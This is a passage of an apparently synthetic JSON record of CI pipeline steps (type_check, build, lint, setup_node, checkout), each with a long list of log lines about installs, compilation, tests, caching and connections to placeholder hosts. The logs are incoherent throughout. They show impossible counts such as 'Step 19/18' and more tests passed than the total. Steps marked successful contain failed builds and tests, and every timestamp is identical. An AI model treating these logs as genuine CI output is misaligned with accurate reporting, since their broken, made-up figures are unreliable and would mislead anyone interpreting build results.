          "[12:19:03] INFO: Starting build process",
          "Step 16/18: Running migrations",
          "Processing...",
          "Time: 55.453s",
          "[12:19:03] INFO: Starting build process",
          "Finished.",
          "Compiling src/index.js...",
          "Cache hit for key-8403",
          "NODE_ENV=development",
          "Artifact downloaded: 1MB",
          "Test Suites: 5 passed, 45 total",
          "[12:19:03] DEBUG: Query executed in 49ms",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Artifact uploaded: dist.zip (31MB)",
          "Step 12/23: Installing dependencies",
          "\u2713 All checks passed",
          "[12:19:03] INFO: Processing request",
          "\u2713 All checks passed",
          "Compiling src/utils.go...",
          "Step 19/19: Running migrations",
          "Connecting to test.io:443...",
          "Cache saved successfully",
          "Cache saved successfully",
          "Pulling image: alpine:3.11",
          "GET /api - 204 (24ms)",
          "Processing...",
          "HEAD is now at bcbb400",
          "pip: Collecting prettier",
          "npm notice: created a lockfile",
          "Success!",
          "Compiling components/app.ts...",
          "pip: Collecting express",
          "\u2713 Task completed in 2926ms",
          "Installing express@1.20.4",
          "Artifact uploaded: dist.zip (61MB)",
          "POST /api - 201 (359ms)",
          "Test Suites: 24 passed, 25 total",
          "GET /api - 200 (23ms)",
          "Success!",
          "[12:19:03] WARN: Deprecated API usage",
          "Time: 3.165s",
          "npm notice: created a lockfile",
          "Checking out develop branch",
          "Loading...",
          "Cache hit for key-5554",
          "Verifying...",
          "Pulling image: python:latest",
          "Compiling utils/app.ts...",
          "Ready.",
          "Verifying...",
          "Step 19/21: Installing dependencies",
          "Optimizing 10 modules...",
          "Checking out develop branch",
          "Done.",
          "Installing axios@1.12.4",
          "[12:19:03] INFO: Request completed",
          "Using Python 3.10",
          "GET /health - 200 (75ms)",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "Completed.",
          "Loading...",
          "FAILED: test_auth_login",
          "Cache invalidated: node_modules",
          "Done.",
          "Compiling src/service.java...",
          "Test Suites: 45 passed, 29 total",
          "WARNING: jest has known vulnerabilities",
          "Step 19/18: Running migrations",
          "npm notice: created a lockfile",
          "yarn add: Done in 14.24s",
          "Compiling lib/index.js...",
          "Verifying...",
          "Step 13/20: Installing dependencies",
          "Checking out develop branch",
          "OK",
          "Compiling components/service.java...",
          "Ran 126 tests in 33s",
          "Artifact downloaded: 49MB",
          "NODE_ENV=test",
          "[12:19:03] DEBUG: Initializing service",
          "pip install: Successfully installed prettier-2.13",
          "Cache invalidated: dependencies",
          "[12:19:03] INFO: Cache refreshed",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-26T12:19:27.624808",
        "finished_at": "2025-11-26T12:20:20.417073",
        "log_lines": [
          "=== Step: build ===",
          "npm notice: package.json updated",
          "npm install: added 71 packages",
          "Step 18/19: Running migrations",
          "[12:19:03] INFO: Processing request",
          "Time: 41.419s",
          "TLS handshake completed",
          "Minifying app.js",
          "Image pulled successfully",
          "pip install: Successfully installed axios-5.17",
          "Layer 1/14: RUN command",
          "WARNING: webpack has known vulnerabilities",
          "Layer 3/12: COPY command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Switched to branch 'hotfix/task-797'",
          "\u2713 All checks passed",
          "Compiling lib/index.js...",
          "Using Node.js 19.15.7",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed lodash-1.16",
          "Time: 114.786s",
          "[12:19:03] INFO: Processing request",
          "[12:19:03] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "OK",
          "[12:19:03] DEBUG: Query executed in 54ms",
          "WARNING: prettier has known vulnerabilities",
          "Exception: ValueError",
          "\u2713 validate completed",
          "pip: Collecting jest",
          "Platform: win32-x64",
          "Step 2/15: Running migrations",
          "Loading...",
          "Cache miss for key-9113",
          "\u2713 Task completed in 508ms",
          "Connection established",
          "npm notice: package.json updated",
          "Completed.",
          "Already up to date.",
          "\u2713 Task completed in 955ms",
          "Cache saved successfully",
          "\u2713 Task completed in 3484ms",
          "NODE_ENV=production",
          "TLS handshake completed",
          "Step 4/18: Installing dependencies",
          "Step 13/21: Testing",
          "POST /api - 202 (94ms)",
          "Cache invalidated: node_modules",
          "Minifying vendor.js",
          "Transforming 588 files...",
          "Switched to branch 'bugfix/task-119'",
          "Using Node.js 17.12.4",
          "Finished.",
          "Using Node.js 18.4.9",
          "Artifact downloaded: 47MB",
          "Uploading artifact 'dist' (24 files)",
          "[12:19:03] INFO: Cache refreshed",
          "OK",
          "Ran 68 tests in 54s",
          "[12:19:03] DEBUG: Query executed in 68ms",
          "Transforming 509 files...",
          "Layer 3/8: COPY command",
          "Step 9/23: Deploying",
          "Installing prettier@2.6.1",
          "Already up to date.",
          "  PASS: e2e/test_api_health.spec.js",
          "\u2713 package completed",
          "Test Suites: 42 passed, 49 total",
          "Building Docker image...",
          "Minifying main.js",
          "Minifying main.js",
          "Optimizing 74 modules...",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] DEBUG: Memory usage: 1864MB",
          "Pushing to registry...",
          "Success!",
          "Platform: win32-x64",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Platform: linux-x64",
          "Layer 10/9: RUN command",
          "Step 6/18: Building",
          "Connecting to cloud.services:443...",
          "Compiling src/utils.go...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Switched to branch 'bugfix/task-111'",
          "Processing...",
          "\u2713 Task completed in 4090ms",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "\u2713 Task completed in 2429ms",
          "pip: Installing build dependencies...",
          "npm install: added 296 packages",
          "[12:19:03] INFO: Cache refreshed",
          "Step 13/15: Linting",
          "POST /upload - 200 (73ms)",
          "Cache saved successfully",
          "Using Node.js 18.16.7",
          "Compiling src/main.py...",
          "Layer 6/14: RUN command",
          "Compiling components/handler.rs...",
          "Time: 118.179s",
          "Success!",
          "Compiling src/main.py...",
          "npm install: added 306 packages",
          "Image pulled successfully",
          "Step 18/25: Running migrations",
          "Pushing to registry...",
          "npm install: added 292 packages",
          "Building Docker image...",
          "GET /health - 204 (35ms)",
          "[12:19:03] INFO: Cache refreshed",
          "Step 10/17: Running migrations",
          "[12:19:03] INFO: Starting build process",
          "npm notice: package.json updated",
          "Step 19/20: Installing dependencies",
          "pip: Installing build dependencies...",
          "  PASS: test_db_connect (82ms)",
          "Step 7/23: Testing",
          "Connecting to example.com:443...",
          "pip: Downloading express-3.1.tar.gz",
          "POST /upload - 202 (158ms)",
          "npm notice: created a lockfile",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/main.py...",
          "Minifying app.js",
          "[12:19:03] WARN: Deprecated API usage",
          "Building Docker image...",
          "Tests: 84 passed, 272 total",
          "Step 19/23: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "[12:19:03] DEBUG: Loading configuration",
          "yarn add: Done in 23.38s",
          "Image pulled successfully",
          "Processing...",
          "Time: 115.372s",
          "Bundling runtime.js",
          "[12:19:03] INFO: Request completed",
          "yarn add: Done in 26.5s",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Verifying...",
          "Time: 21.218s",
          "Creating production build...",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] DEBUG: Loading configuration",
          "Switched to branch 'hotfix/task-409'",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 4/19: Installing dependencies",
          "Step 13/16: Deploying",
          "Compiling src/index.js...",
          "[12:19:03] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Time: 92.109s",
          "\u2713 Step 'test' succeeded",
          "\u2713 All checks passed",
          "Already up to date.",
          "Done.",
          "[12:19:03] INFO: Cache refreshed",
          "Already up to date.",
          "Uploading artifact 'dist' (32 files)",
          "Artifact uploaded: dist.zip (30MB)",
          "Ran 90 tests in 9s",
          "Finished.",
          "Compiling utils/app.ts...",
          "Cache miss for key-9940",
          "[12:19:03] DEBUG: Loading configuration",
          "Ran 152 tests in 52s",
          "[12:19:03] INFO: Connecting to database",
          "Fetching submodules...",
          "Success!",
          "[12:19:03] DEBUG: Memory usage: 1345MB",
          "Using Node.js 20.0.6",
          "Completed.",
          "npm notice: package.json updated",
          "OK",
          "Ran 190 tests in 44s",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Checking out master branch",
          "Connecting to cloud.services:443...",
          "Using Node.js 18.10.4",
          "Step 8/18: Linting",
          "Success!",
          "npm notice: created a lockfile",
          "OK",
          "[12:19:03] ERROR: Connection failed",
          "Cache miss for key-4434",
          "[12:19:03] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 99",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Step 1/19: Testing",
          "WARNING: jest has known vulnerabilities",
          "Loading...",
          "Cache invalidated: build",
          "Snapshots: 43 passed, 50 total",
          "Step 7/21: Running migrations",
          "  PASS: unit/test_db_connect.spec.js",
          "[12:19:03] INFO: Request completed",
          "Pushing to registry...",
          "Compiling components/app.ts...",
          "Environment: development",
          "[12:19:03] INFO: Processing request",
          "Using Node.js 19.14.2",
          "Optimizing 41 modules...",
          "Compiling src/app.ts...",
          "[12:19:03] DEBUG: Connection pool: 6 active",
          "Time: 38.340s",
          "GET /status - 201 (86ms)",
          "npm notice: package.json updated",
          "\u2713 Task completed in 3382ms",
          "[12:19:03] INFO: Request completed",
          "Cache miss for key-1566",
          "Success!",
          "Installing axios@3.18.9",
          "Completed.",
          "[12:19:03] DEBUG: Memory usage: 447MB",
          "\u2713 All checks passed",
          "Step 18/16: Building",
          "[12:19:03] INFO: Connecting to database",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-26T12:20:20.417073",
        "finished_at": "2025-11-26T12:20:38.014495",
        "log_lines": [
          "=== Step: lint ===",
          "Platform: darwin-arm64",
          "Creating production build...",
          "[12:19:03] ERROR: Connection failed",
          "[12:19:03] INFO: Starting build process",
          "Platform: linux-x64",
          "Step 15/18: Installing dependencies",
          "Cache invalidated: dependencies",
          "\u2713 All checks passed",
          "GET /health - 201 (67ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "WARNING: lodash has known vulnerabilities",
          "Compiling components/utils.go...",
          "Tests: 302 passed, 162 total",
          "Artifact downloaded: 39MB",
          "\u2713 deploy completed",
          "OK",
          "Installing express@3.16.6",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:03] DEBUG: Initializing service",
          "Loading...",
          "Compiling lib/handler.rs...",
          "[12:19:03] WARN: Deprecated API usage",
          "Step 19/23: Building",
          "HEAD is now at dc2d3ee",
          "Pushing to registry...",
          "HEAD is now at fd0499f",
          "Snapshots: 3 passed, 48 total",
          "Bundling main.css",
          "Platform: win32-x64",
          "Verifying...",
          "Compiling lib/service.java...",
          "[12:19:03] DEBUG: Memory usage: 1058MB",
          "Platform: win32-x64",
          "Already up to date.",
          "Artifact uploaded: dist.zip (84MB)",
          "Coverage: 100% statements, 63% branches",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Switched to branch 'bugfix/task-615'",
          "Using Python 3.11",
          "NODE_ENV=production",
          "Transforming 215 files...",
          "Completed.",
          "Coverage: 87% statements, 97% branches",
          "[12:19:03] DEBUG: Query executed in 51ms",
          "TLS handshake completed",
          "Environment: development",
          "[12:19:03] DEBUG: Memory usage: 1378MB",
          "WARNING: jest has known vulnerabilities",
          "\u2713 validate completed",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Processing...",
          "  PASS: integration/test_auth_login.spec.js",
          "Compiling src/index.js...",
          "Switched to branch 'hotfix/task-688'",
          "Platform: win32-x64",
          "Pushing to registry...",
          "[12:19:03] INFO: Processing request",
          "\u2713 Task completed in 813ms",
          "pip: Collecting lodash",
          "Artifact downloaded: 3MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Connection established",
          "npm notice: created a lockfile",
          "Platform: linux-x64",
          "Step 9/17: Installing dependencies",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "Waiting...",
          "Already up to date.",
          "Cache restored successfully (198MB)",
          "Cache restored successfully (14MB)",
          "[12:19:03] DEBUG: Connection pool: 9 active",
          "POST /api - 202 (42ms)",
          "Connecting to example.com:443...",
          "Step 15/16: Running migrations",
          "Compiling src/app.ts...",
          "Finished.",
          "Image pulled successfully",
          "Tests: 344 passed, 289 total",
          "Installing webpack@2.4.4",
          "[12:19:03] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:19:03] WARN: Deprecated API usage",
          "Cache miss for key-8013",
          "Success!",
          "pip: Collecting lodash",
          "Step 16/19: Installing dependencies",
          "Processing...",
          "Step 15/19: Building",
          "Generating source maps...",
          "Compiling components/app.ts...",
          "\u2713 All checks passed",
          "Artifact downloaded: 42MB",
          "Step 10/15: Installing dependencies",
          "pip: Downloading prettier-5.17.tar.gz",
          "\u2713 validate completed",
          "Step 2/23: Running migrations",
          "Compiling src/index.js...",
          "Switched to branch 'feature/task-429'",
          "Ran 143 tests in 43s",
          "[12:19:03] DEBUG: Initializing service",
          "  PASS: test_auth_login (148ms)",
          "[12:19:03] INFO: Starting build process",
          "Uploading artifact 'dist' (23 files)",
          "Compiling src/utils.go...",
          "Step 16/16: Linting",
          "[12:19:03] DEBUG: Connection pool: 8 active",
          "Artifact downloaded: 40MB",
          "Creating production build...",
          "Tests: 241 passed, 317 total",
          "Platform: win32-x64",
          "\u2717 build failed with exit code 45",
          "WARNING: jest has known vulnerabilities",
          "yarn add: Done in 11.65s",
          "HEAD is now at 4eaa8ce",
          "\u2713 Task completed in 958ms",
          "Snapshots: 2 passed, 13 total",
          "Compiling src/service.java...",
          "[12:19:03] DEBUG: Query executed in 29ms",
          "[12:19:03] INFO: Connecting to database",
          "Using Node.js 16.18.8",
          "npm notice: created a lockfile",
          "\u2713 validate completed",
          "Already up to date.",
          "npm notice: created a lockfile",
          "pip: Downloading lodash-3.14.tar.gz",
          "NODE_ENV=test",
          "Cache hit for key-5507",
          "Step 16/18: Linting",
          "[12:19:03] INFO: Processing request",
          "Loading...",
          "Cache saved successfully",
          "Ran 63 tests in 20s",
          "Time: 74.221s",
          "OK",
          "[12:19:03] WARN: Deprecated API usage",
          "pip install: Successfully installed jest-2.2",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: eslint has known vulnerabilities",
          "Checking out main branch",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Verifying...",
          "Generating source maps...",
          "Step 18/17: Linting",
          "Cache invalidated: build",
          "[12:19:03] DEBUG: Memory usage: 897MB",
          "[12:19:03] INFO: Starting build process",
          "Installing jest@5.9.5",
          "Environment: staging",
          "[12:19:03] DEBUG: Connection pool: 17 active",
          "[12:19:03] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 16/23: Linting",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:19:03] INFO: Cache refreshed",
          "WARNING: eslint has known vulnerabilities",
          "Installing react@1.16.3",
          "Ready.",
          "pip: Downloading express-4.20.tar.gz",
          "HEAD is now at 37e71ba",
          "Pushing to registry...",
          "Step 19/21: Linting",
          "Finished.",
          "npm notice: created a lockfile",
          "Time: 77.158s",
          "Step 3/20: Running migrations",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Transforming 360 files...",
          "[12:19:03] DEBUG: Initializing service",
          "Cache invalidated: build",
          "[12:19:03] INFO: Starting build process",
          "\u2713 build completed",
          "Cache miss for key-5797",
          "[12:19:03] DEBUG: Loading configuration",
          "FAILED: test_user_create",
          "Fetching submodules...",
          "HEAD is now at 381b5f5",
          "\u2713 All checks passed",
          "Using Python 3.12",
          "Step 11/25: Deploying",
          "npm install: added 464 packages",
          "[12:19:03] INFO: Processing request",
          "Step 12/22: Testing",
          "Cache hit for key-4469",
          "  PASS: unit/test_user_create.spec.js",
          "Verifying...",
          "\u2717 build failed with exit code 103",
          "Checking out master branch",
          "[12:19:03] INFO: Starting build process",
          "Platform: linux-x64",
          "\u2713 All checks passed",
          "\u2713 Step 'test' succeeded",
          "  PASS: test_user_create (44ms)",
          "\u2713 All checks passed",
          "WARNING: axios has known vulnerabilities",
          "pip: Collecting react",
          "pip: Collecting express",
          "Pulling image: node:18",
          "Uploading artifact 'coverage' (9 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Loading...",
          "Verifying...",
          "Image pulled successfully",
          "Fetching submodules...",
          "Platform: darwin-arm64",
          "[12:19:03] INFO: Connecting to database",
          "[12:19:03] INFO: Starting build process",
          "Test Suites: 16 passed, 8 total",
          "Ready.",
          "npm notice: created a lockfile",
          "Artifact downloaded: 32MB",
          "Ready.",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-26T12:20:38.014495",
        "finished_at": "2025-11-26T12:20:55.611917",
        "log_lines": [
          "=== Step: setup_node ===",
          "Uploading artifact 'build' (20 files)",
          "Uploading artifact 'build' (49 files)",
          "Cache saved successfully",
          "Cache invalidated: build",
          "Processing...",
          "pip: Downloading jest-1.10.tar.gz",
          "Using Python 3.10",
          "Connection established",
          "Compiling lib/utils.go...",
          "Pulling image: python:3.11",
          "HEAD is now at 02cfcc2",
          "[12:19:03] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "[12:19:03] ERROR: Connection failed",
          "Uploading artifact 'build' (16 files)",
          "pip: Collecting axios",
          "\u2713 lint completed",
          "Bundling vendor.css",
          "FAILED: test_api_health",
          "Verifying...",
          "Pulling image: alpine:18",
          "Cache hit for key-2130",
          "Cache saved successfully",
          "Cache miss for key-7193",
          "FAILED: test_db_connect",
          "POST /upload - 201 (54ms)",
          "npm install: added 87 packages",
          "Cache restored successfully (354MB)",
          "Bundling main.js",
          "Switched to branch 'feature/task-142'",
          "npm notice: package.json updated",
          "[12:19:03] WARN: Deprecated API usage",
          "Platform: darwin-arm64",
          "Uploading artifact 'build' (12 files)",
          "[12:19:03] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:03] WARN: Deprecated API usage",
          "Verifying...",
          "[12:19:03] WARN: Deprecated API usage",
          "yarn add: Done in 1.45s",
          "Uploading artifact 'dist' (47 files)",
          "pip: Collecting express",
          "Snapshots: 42 passed, 39 total",
          "Generating source maps...",
          "npm install: added 487 packages",
          "Environment: test",
          "GET /status - 201 (100ms)",
          "Transforming 129 files...",
          "[12:19:03] DEBUG: Connection pool: 5 active",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Success!",
          "Compiling lib/handler.rs...",
          "Compiling src/utils.go...",
          "Pushing to registry...",
          "pip: Collecting prettier",
          "yarn add: Done in 7.44s",
          "Creating production build...",
          "  PASS: test_user_create (220ms)",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Generating source maps...",
          "\u2713 Task completed in 619ms",
          "Building Docker image...",
          "Finished.",
          "\u2713 Task completed in 4941ms",
          "Waiting...",
          "Pushing to registry...",
          "[12:19:03] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Creating production build...",
          "Generating source maps...",
          "Using Python 3.12",
          "WARNING: webpack has known vulnerabilities",
          "Step 16/24: Linting",
          "Platform: linux-x64",
          "[12:19:03] INFO: Request completed",
          "Generating source maps...",
          "Step 12/18: Installing dependencies",
          "Building Docker image...",
          "Compiling components/app.ts...",
          "Success!",
          "pip: Downloading eslint-3.16.tar.gz",
          "Pulling image: python:latest",
          "Success!",
          "[12:19:03] INFO: Request completed",
          "npm install: resolved 323 packages",
          "Optimizing 95 modules...",
          "Installing react@3.2.7",
          "Compiling utils/main.py...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "Layer 7/8: COPY command",
          "Processing...",
          "Step 5/23: Deploying",
          "[12:19:03] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: e2e/test_db_connect.spec.js",
          "Bundling styles.css",
          "Processing...",
          "WARNING: express has known vulnerabilities",
          "  PASS: e2e/test_user_create.spec.js",
          "pip install: Successfully installed express-5.13",
          "Cache hit for key-7981",
          "Exception: RuntimeError",
          "Environment: staging",
          "Loading...",
          "Using Node.js 15.9.9",
          "yarn add: Done in 5.42s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "GET /health - 201 (41ms)",
          "Ran 157 tests in 21s",
          "Compiling lib/handler.rs...",
          "Step 6/23: Running migrations",
          "yarn add: Done in 22.84s",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:19:03] DEBUG: Connection pool: 2 active",
          "WARNING: webpack has known vulnerabilities",
          "Finished.",
          "Layer 3/15: ENV command",
          "pip: Downloading lodash-2.14.tar.gz",
          "Step 7/19: Deploying",
          "Already up to date.",
          "[12:19:03] DEBUG: Connection pool: 2 active",
          "[12:19:03] DEBUG: Query executed in 4ms",
          "Artifact downloaded: 6MB",
          "Cache restored successfully (402MB)",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_api_health",
          "Tests: 497 passed, 299 total",
          "Finished.",
          "\u2713 lint completed",
          "Compiling utils/handler.rs...",
          "[12:19:03] INFO: Connecting to database",
          "WARNING: eslint has known vulnerabilities",
          "Switched to branch 'feature/task-965'",
          "Generating source maps...",
          "[12:19:03] WARN: Deprecated API usage",
          "Creating production build...",
          "Installing lodash@1.18.7",
          "Step 9/20: Installing dependencies",
          "\u2713 Step 'build' succeeded",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "pip install: Successfully installed react-3.7",
          "Cache restored successfully (266MB)",
          "HEAD is now at efba6b8",
          "\u2713 Task completed in 1968ms",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "Step 5/21: Running migrations",
          "Connection established",
          "Building Docker image...",
          "Transforming 534 files...",
          "[12:19:03] DEBUG: Loading configuration",
          "Step 19/20: Deploying",
          "Cache hit for key-8356",
          "Compiling lib/app.ts...",
          "Cache invalidated: dependencies",
          "[12:19:03] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Step 'test' succeeded",
          "Artifact uploaded: dist.zip (61MB)",
          "Uploading artifact 'dist' (48 files)",
          "Ready.",
          "Artifact uploaded: dist.zip (64MB)",
          "Verifying...",
          "npm notice: created a lockfile",
          "[12:19:03] INFO: Cache refreshed",
          "[12:19:03] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Done.",
          "Using Node.js 17.3.4",
          "Cache restored successfully (124MB)",
          "Compiling src/handler.rs...",
          "Switched to branch 'hotfix/task-805'",
          "[12:19:03] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 14/21: Linting",
          "Step 11/24: Installing dependencies",
          "\u2717 build failed with exit code 17",
          "[12:19:03] WARN: Deprecated API usage",
          "FAILED: test_user_create",
          "Tests: 171 passed, 358 total",
          "pip install: Successfully installed express-2.4",
          "Step 18/25: Testing",
          "[12:19:03] INFO: Request completed",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-732'",
          "WARNING: prettier has known vulnerabilities",
          "Platform: linux-x64",
          "Time: 41.839s",
          "Cache hit for key-4049",
          "[12:19:03] DEBUG: Query executed in 1ms",
          "Image pulled successfully",
          "Cache saved successfully",
          "POST /upload - 200 (424ms)",
          "OK",
          "\u2713 build completed",
          "OK",
          "npm install: resolved 186 packages",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "[12:19:03] INFO: Request completed",
          "Compiling components/service.java...",
          "Waiting...",
          "Connecting to test.io:443...",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] WARN: Deprecated API usage",
          "yarn add: Done in 8.44s",
          "Optimizing 78 modules...",
          "npm notice: package.json updated",
          "Finished.",
          "Snapshots: 8 passed, 46 total",
          "Cache hit for key-9565",
          "Generating source maps...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-26T12:20:55.611917",
        "finished_at": "2025-11-26T12:21:02.650886",
        "log_lines": [
          "=== Step: checkout ===",
          "Pushing to registry...",
          "Fetching submodules...",
          "WARNING: express has known vulnerabilities",
          "pip: Downloading webpack-5.2.tar.gz",
          "Compiling components/utils.go...",
          "Compiling src/handler.rs...",
          "[12:19:03] DEBUG: Initializing service",
          "  PASS: test_db_connect (319ms)",
          "Generating source maps...",
          "Already up to date.",
          "yarn add: Done in 24.25s",
          "Creating production build...",
          "Time: 57.453s",
          "Layer 9/11: ENV command",
          "Verifying...",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "HEAD is now at bac606e",
          "POST /upload - 202 (124ms)",
          "Step 4/18: Testing",
          "Connection established",
          "Layer 2/15: ENV command",
          "GET /api - 200 (3ms)",
          "[12:19:03] INFO: Request completed",
          "npm install: resolved 103 packages",
          "[12:19:03] INFO: Connecting to database",
          "Optimizing 61 modules...",
          "\u2713 Step 'build' succeeded",
          "Uploading artifact 'build' (8 files)",
          "[12:19:03] DEBUG: Initializing service",
          "Time: 102.568s",
          "Cache miss for key-5661",
          "pip install: Successfully installed express-3.13",
          "Transforming 802 files...",
          "Compiling src/main.py...",
          "Checking out master branch",
          "yarn add: Done in 18.2s",
          "[12:19:03] INFO: Processing request",
          "Building Docker image...",
          "Optimizing 99 modules...",
          "GET /status - 201 (62ms)",
          "Fetching submodules...",
          "POST /data - 200 (151ms)",
          "Installing axios@3.6.5",
          "Coverage: 98% statements, 82% branches",
          "Pushing to registry...",
          "Installing jest@1.6.0",
          "npm install: resolved 955 packages",
          "pip install: Successfully installed react-3.17",
          "[12:19:03] INFO: Request completed",
          "OK",
          "Using Python 3.9",
          "Image pulled successfully",
          "Switched to branch 'feature/task-787'",
          "WARNING: jest has known vulnerabilities",
          "Processing...",
          "Cache miss for key-9325",
          "Creating production build...",
          "npm install: added 40 packages",
          "POST /api - 200 (38ms)",
          "Pushing to registry...",
          "Uploading artifact 'coverage' (5 files)",
          "\u2717 build failed with exit code 81",
          "Step 9/15: Linting",
          "Processing...",
          "[12:19:03] INFO: Request completed",
          "Coverage: 72% statements, 65% branches",
          "Connecting to acme.corp:443...",
          "Verifying...",
          "Transforming 887 files...",
          "[12:19:03] DEBUG: Query executed in 3ms",
          "Step 10/25: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "yarn add: Done in 8.46s",
          "Artifact downloaded: 50MB",
          "Creating production build...",
          "OK",
          "[12:19:03] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Collecting react",
          "Coverage: 76% statements, 80% branches",
          "Compiling components/index.js...",
          "Transforming 824 files...",
          "Transforming 321 files...",
          "[12:19:03] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "Compiling components/app.ts...",
          "Connecting to example.com:443...",
          "[12:19:03] INFO: Cache refreshed",
          "Connection established",
          "Generating source maps...",
          "pip: Downloading react-5.6.tar.gz",
          "Platform: win32-x64",
          "Ready.",
          "Test Suites: 35 passed, 5 total",
          "pip install: Successfully installed express-3.3",
          "Layer 3/11: ENV command",
          "Fetching submodules...",
          "Cache restored successfully (132MB)",
          "Fetching submodules...",
          "Creating production build...",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:19:03] INFO: Request completed",
          "Compiling utils/handler.rs...",
          "Pushing to registry...",
          "\u2713 package completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 65 modules...",
          "Step 8/25: Running migrations",
          "Artifact downloaded: 45MB",
          "\u2717 build failed with exit code 13",
          "Layer 7/10: ENV command",
          "Connecting to example.com:443...",
          "Success!",
          "Cache hit for key-1375",
          "Step 13/19: Installing dependencies",
          "[12:19:03] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "npm install: added 299 packages",
          "[12:19:03] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "[12:19:03] WARN: Deprecated API usage",
          "Done.",
          "[12:19:03] INFO: Starting build process",
          "\u2713 Step 'build' succeeded",
          "Fetching submodules...",
          "HEAD is now at 14687ba",
          "[12:19:03] DEBUG: Loading configuration",
          "[12:19:03] INFO: Processing request",
          "[12:19:03] DEBUG: Query executed in 32ms",
          "pip install: Successfully installed react-1.17",
          "Test Suites: 33 passed, 22 total",
          "Time: 19.772s",
          "\u2717 build failed with exit code 24",
          "Step 13/18: Testing",
          "Installing eslint@5.12.3",
          "[12:19:03] ERROR: Connection failed",
          "Step 18/25: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'build' succeeded",
          "Building Docker image...",
          "  PASS: test_cache_hit (361ms)",
          "npm notice: created a lockfile",
          "OK",
          "Ready.",
          "Checking out develop branch",
          "Processing...",
          "Layer 2/9: RUN command",
